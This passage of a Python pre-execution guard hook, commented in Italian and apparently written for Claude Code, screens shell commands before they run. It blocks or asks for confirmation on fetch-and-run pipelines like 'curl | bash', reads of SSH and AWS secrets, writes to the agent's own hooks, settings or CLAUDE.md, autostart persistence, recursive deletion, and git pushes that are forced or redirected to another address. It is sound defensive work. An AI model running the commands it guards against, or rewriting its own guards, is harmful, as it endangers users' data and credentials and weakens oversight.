    if data.get("tool_name") not in ("Bash", "Monitor"):  # Monitor lancia comandi shell (19/10/2026)
        return 0
    command = (data.get("tool_input") or {}).get("command", "")
    if not isinstance(command, str) or not command:
        return 0
    cwd = data.get("cwd") or _home()

    # Il testo che la shell esegue davvero: senza i corpi degli heredoc quotati
    # verso python o cat e senza i messaggi -m che citano un comando.
    testo = _testo_shell(command)
    _ASSEGNATE.clear()
    _ASSEGNATE.update(_assegnazioni(command))

    # 1) Blocco duro
    if not _inert_reference(command):
        try:
            # senza i commenti: `curl u | # nota` + a capo + `bash` è una pipeline sola (#5097)
            istruzioni = _fc.istruzioni(_fc.togli_commenti(testo))
        except Exception:
            istruzioni = [testo]
        regole = [(p, w, [testo]) for p, w in DANGEROUS] + [(p, w, istruzioni) for p, w in DANGEROUS_ISTRUZIONE]
        try:
            pericoloso = _programma_pericoloso(testo)
        except Exception:
            pericoloso = None
        if pericoloso:
            regole.insert(0, (r"[\s\S]", pericoloso, [testo]))
        for pattern, why, testi in regole:
            if any(re.search(pattern, t, re.IGNORECASE) for t in testi):
                sys.stderr.write(
                    f"Bloccato: questo comando sembra {why}. "
                    "Non proporre all'utente di eseguirlo a mano: per installare un programma "
                    "indica l'installer o il pacchetto ufficiale. L'assistente non esegue "
                    "operazioni distruttive irreversibili.\n"
                )
                return 2
        try:
            motivo = _distruzione_totale(command)
        except Exception:
            motivo = None
        if motivo:
            sys.stderr.write(
                f"Bloccato: questo comando sembra {motivo}. L'assistente non esegue operazioni "
                "distruttive irreversibili, e non proporre all'utente di eseguirlo a mano.\n"
            )
            return 2

    # Su Windows le regex dei percorsi leggono il testo con le barre dritte, e il codice di cmd e powershell
    # ha le sue regole (review del 9/11/2026, #5096).
    dritto = _barre(testo)
    try:
        windows = _regole_windows(testo)
    except Exception:
        windows = set()

    # 2) Scrittura shell su config/hook di Claude Code -> ask (auto-modifica guardie)
    if CONFIG_WRITE_RE.search(dritto) or "config" in windows or _writes_config(testo, cwd, cancella=True):
        return _ask("config",
            "Scrittura via shell su settings/hook di Claude Code o sull'aggiornamento automatico "
            "di Arturo: modificherebbe le guardie stesse, o cosa si installa da solo. Conferma "
            "solo se stai aggiornando la config di proposito."
        )

    # 2a) Scrittura shell su un CLAUDE.md -> ask (le istruzioni di ogni sessione futura).
    # Dal 31/10/2026 conta il percorso risolto, come per Edit e Write: ~/.claude/CLAUDE.md chiede sempre,
    # un CLAUDE.md di progetto tace se protect_claude_md.local dice "allow claude-md-progetto". La regex
    # testuale resta per le scritture che non si risolvono (open() in python): quelle chiedono.
    # Dal 1/11/2026 (F16 F17) ogni scrittura si giudica da sola: il globale chiede anche se lo stesso
    # comando scrive un CLAUDE.md di progetto, il confronto passa da realpath (un link verso il globale
    # non è un CLAUDE.md di progetto), crearne uno nuovo chiede sempre come in protect_claude_md.py, e
    # open() di python su un CLAUDE.md chiede sempre: _writes_config non lo risolve.
    def _globale(p):
        return _is_claude_md_globale(p) or (bool(p) and _is_claude_md_globale(os.path.realpath(p)))

    globale = _writes_config(testo, cwd, _globale)
    # sed -i su un file che non esiste non lo crea: per i CLAUDE.md nuovi conta solo chi scrive davvero.
    progetto_nuovo = _writes_config(testo, cwd, sed=False, protetto=lambda p: _is_claude_md(p) and not _globale(p)
                                    and not os.path.exists(p))
    progetto = _writes_config(testo, cwd, lambda p: _is_claude_md(p) and not _globale(p) and os.path.exists(p))
    risolto = _writes_config(testo, cwd, lambda p: _is_claude_md(p) and not _globale(p))
    if globale or progetto_nuovo or (progetto and not _claude_md_progetto_libero()) or \
            CLAUDE_MD_OPEN_RE.search(dritto) or "claude-md" in windows or \
            (CLAUDE_MD_WRITE_RE.search(dritto) and not risolto):
        return _ask("claude-md",
            "Scrittura via shell su un CLAUDE.md: cambierebbe le istruzioni di ogni sessione "
            "futura in quella cartella. Conferma solo se sei tu a volerlo. Per una modifica sola "
            "Claude usa Edit, che chiede una volta."
        )

    # 2a-bis) Scrittura shell su un percorso di avvio automatico -> ask (persistenza)
    if PERSIST_WRITE_RE.search(dritto) or "avvio-automatico" in windows or _writes_config(testo, cwd, _is_persistenza):
        return _ask("avvio-automatico",
            "Scrittura via shell su un git hook o su un servizio di avvio automatico "
            "(LaunchAgents, systemd, autostart): il codice partirebbe da solo a ogni "
            "commit o a ogni accesso. Conferma solo se l'hai chiesto tu."
        )

    # 2b) Creazione di un file di unlock -> ask (sbloccherebbe l'auto-modifica)
    sblocco = UNLOCK_RE.search(dritto) or "sblocco" in windows or _writes_config(testo, cwd, _is_unlock, crea=True)
    if sblocco and "claude-md-unlock" in testo and "config-unlock" not in testo:
        return _ask("sblocco-claude-md",
            "Sblocco della modifica di CLAUDE.md per questa sessione: Claude potrà "
            "cambiare le istruzioni che segue. Conferma se sei tu ad aver chiesto la modifica."
        )
    if sblocco:
        return _ask("sblocco",
            "Creazione di un file di unlock che disattiverebbe la protezione "
            "sull'auto-modifica di config/hook. Conferma solo se sei tu a volerlo."
        )

    # 3) Lettura di file segreti via shell -> ask (per-segmento, alta precisione)
    if _reads_secret(command) or "segreto" in windows:
        return _ask("segreto",
            "Lettura di un file segreto via shell (chiave privata, credenziali, "
            "~/.ssh, ~/.aws...). Conferma solo se serve davvero: il contenuto "
            "finirebbe nel contesto e potrebbe essere esfiltrato."
        )

    # 3-bis) sed che scrive col comando `w` -> ask
    if _sed_scrive(command):
        return _ask("sed-w",
            "sed scrive su file col comando `w` (vale anche sotto -n e come flag "
            "di s///): il file indicato viene sovrascritto. Conferma solo se la "
            "scrittura è voluta."
        )

    # 3-ter) sed che esegue un comando di shell (`e`, flag `e` di s///) -> ask (1/11/2026, F05)
    if _sed_esegue(command):
        return _ask("sed-e",
            "sed esegue in shell un comando col comando `e` o col flag `e` di s///: il testo diventa "
            "un comando, anche un rm. Conferma solo se l'esecuzione è voluta."
        )

    # 4) Docker distruttivo su volumi -> ask
    if DOCKER_DESTRUCTIVE_RE.search(command):
        return _ask("docker-volumi",
            "Rimozione di volumi Docker (dati persistenti). Irreversibile: "
            "conferma solo se vuoi davvero cancellare i dati dei container."
        )

    # 5) rm ricorsivo -> ask, tranne cartelle rigenerabili e file temporanei.
    # Chi usa Arturo spesso non programma: una cartella di capitoli o i Documenti
    # valgono quanto la config, e sul terminale non c'è cestino.
    try:
        for targets, cwd_decl in _rm_segments(command):
            if targets is None:
                return _ask("rm-xargs",
                    "Cancellazione ricorsiva dietro xargs, da una pipe o con il programma in una variabile: "
                    "i percorsi non si possono controllare prima. Conferma solo se sai cosa cancella."
                )
            for base_cwd, t in [(b, t) for b in _basi_dopo_cd(cwd_decl, cwd) for t in (targets or ["."])]:
                if t in BARE_TARGETS:
                    p = os.path.normpath(base_cwd) if base_cwd else None
                else:
                    p = _resolve(t, base_cwd)
                if p is not None and _sotto_link_nuovo(p, command, cwd):
                    return _ask("rm-ignoto",
                        f"rm ricorsivo su {t}, sotto un link che lo stesso comando crea: la cartella vera "
                        "non si conosce prima. Controlla dove punta il link prima di confermare."
                    )
                reale = _reale(p)
                if reale != p and (_is_protected_tree(reale) or not (_rigenerabile(reale) or _temporaneo(reale))):
                    return _ask("rm-protetto" if _is_protected_tree(reale) else "rm-cartella",
                        f"rm ricorsivo su {p}, che attraverso un link porta a {reale}. Dal terminale non passa "
                        "dal cestino: conferma solo se vuoi davvero cancellarlo."
                    )
                if _is_protected_tree(p):
                    return _ask("rm-protetto",
                        f"rm ricorsivo su un percorso protetto ({p}): memoria, "
                        "progetti o config di Claude Code. Irreversibile: dal terminale "
                        "non passa dal cestino. Conferma solo se vuoi davvero cancellarlo."
                    )
                if p is None:
                    return _ask("rm-ignoto",
                        f"rm ricorsivo su un percorso che non so risolvere ({t}). "
                        "Irreversibile: controlla la cartella prima di confermare."
                    )
                if not (_rigenerabile(p) or _temporaneo(p)):
                    return _ask("rm-cartella",
                        f"rm ricorsivo su una cartella ({p}). Dal terminale non passa "
                        "dal cestino: se dentro c'è lavoro tuo, lo perdi. Conferma solo "
                        "se vuoi davvero cancellarla."
                    )
    except Exception:
        return _ask("rm-illeggibile", "rm ricorsivo che la guardia non riesce a leggere: controlla prima di confermare.")

    # 6) find che cancella -> ask
    try:
        cancella = _find_delete(command)
    except Exception:
        cancella = "find" in command  # come rm e rmtree: un find che la guardia non legge si controlla
    if cancella:
        return _ask("find-delete",
            "find con -delete o -exec rm cancella file in blocco, senza cestino. "
            "Conferma solo se hai controllato cosa trova."
        )

    # 7) shutil.rmtree -> ask, come rm ricorsivo: tranne cartelle rigenerabili e file temporanei.
    try:
        for t in _rmtree_bersagli(command):
            if t == _TEMPORANEA:
                continue
            p = _resolve(t, os.path.normpath(cwd)) if t else None
            if p is None:
                return _ask("rmtree-variabile",
                    "shutil.rmtree su un percorso che arriva da una variabile: cancella una cartella "
                    "intera, senza cestino. Controlla quale prima di confermare."
                )
            reale = _reale(p)
            if _is_protected_tree(p) or not (_rigenerabile(p) or _temporaneo(p)) or \
                    _is_protected_tree(reale) or not (_rigenerabile(reale) or _temporaneo(reale)):
                return _ask("rmtree-cartella",
                    f"shutil.rmtree su una cartella ({p}): la cancella intera, senza cestino. Se dentro "
                    "c'è lavoro tuo, lo perdi. Conferma solo se vuoi davvero cancellarla."
                )
    except Exception:
        return _ask("rmtree-illeggibile", "shutil.rmtree che la guardia non riesce a leggere: controlla prima di confermare.")

    # 8) git clean -f -> ask: i file non tracciati non stanno in nessun commit.
    if _git_clean_forzato(command):
        return _ask("git-clean",
            "git clean -f cancella i file che git non traccia: non stanno in nessun commit e non "
            "tornano indietro. Prova prima con `git clean -n` per vedere cosa toglie."
        )

    # 8-bis) push verso una destinazione riscritta nello stesso comando -> ask
    try:
        riscritto = _push_riscritto(command)
    except Exception:
        riscritto = bool(re.search(r"\bpush\b", command) and re.search(r"(?i)insteadof|\.url=|config-env|GIT_CONFIG_", command))
    if riscritto:
        return _ask("git-destinazione",
            "git push con la destinazione riscritta nello stesso comando (git -c remote.<nome>.url=, "
            "insteadOf, pushurl, --config-env o GIT_CONFIG_*): il contenuto andrebbe a un indirizzo che il "
            "repository non ha configurato. Conferma solo se l'indirizzo è tuo."
        )

    # 8-ter) push che riscrive o cancella rami remoti -> ask (finding 5): il rail dei deny, in ogni forma.
    try:
        forzato = _push_forzato(command)
    except Exception:
        forzato = "git push che la guardia non riesce a leggere" if re.search(
            r"\bpush\b[^\n;&|]*(\s-[a-z]*[fd]|--(forc|mir|del|pru)|\s[+:])", command) else None
    if forzato:
        # Il nome di regola è quello del push riscritto: un nome nuovo va anche in server/logica.js, e il
        # Worker si pubblica col lotto del server (L3), non con questo.
        return _ask("git-destinazione",
            f"{forzato}. Il lavoro che c'era sul remoto, anche di altri, sparisce. Conferma solo se il "
            "ramo è tuo e sai cosa sostituisci."
        )

    # 9) git branch -D e git stash drop -> ask, solo se il lavoro non esiste altrove (31/10/2026).
    try:
        perde = _git_perde_lavoro(command, cwd)
    except Exception:
        perde = ("git-ramo", "git branch -D, git stash drop o git worktree remove --force che la guardia non "
                 "riesce a leggere: controlla prima di confermare.") if re.search(
                     r"branch\s.*(-[a-zA-Z]*D|--d)|stash\s+(drop|clear)|worktree\s+remove\s.*(-[a-zA-Z]*f|--f)",
                     command) else None
    if perde and perde[0] == "git-stash":
        return _ask("git-stash", perde[1])
    if perde and perde[0] == "git-worktree":
        return _ask("git-worktree", perde[1])
    if perde:
        return _ask("git-ramo", perde[1])

    # 10) git commit --amend su un HEAD che questa sessione non ha registrato -> ask (3/11/2026, #4187).
    try:
        altrui = _amend_altrui(command, cwd, data.get("session_id"))
    except Exception:
        altrui = ("git commit --amend che la guardia non riesce a leggere: controlla con `git log -1` "
                  "prima di confermare.") if re.search(r"\bcommit\b.*--am", command) else None
    if altrui:
        return _ask("git-amend", altrui)

    return 0


if __name__ == "__main__":
    # Claude Code scrive e legge in UTF-8. Su Windows la pipe è in cp1252 (16/10/2026).
    for _flusso in (sys.stdout, sys.stderr):
        try:
            _flusso.reconfigure(encoding="utf-8")
        except (AttributeError, ValueError):
            pass
    sys.exit(main())
